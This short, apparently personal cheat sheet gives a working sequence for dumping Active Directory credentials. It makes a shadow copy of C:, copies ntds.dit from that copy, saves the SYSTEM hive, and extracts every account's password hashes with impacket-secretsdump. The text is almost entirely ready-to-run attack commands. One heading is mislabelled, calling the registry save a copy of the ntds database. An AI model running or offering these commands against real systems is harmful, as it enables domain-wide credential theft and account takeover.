Performing a shadow copy of the entire C: drive
```
vshadow.exe -nw -p C:
```
copy the `Shadow copy device name:`

copying the ntds database to the C: drive
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

copying the ntds database to the C: drive
```
reg.exe save hklm\system c:\system.bak
```

parse the file locally by adding the LOCAL keyword
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```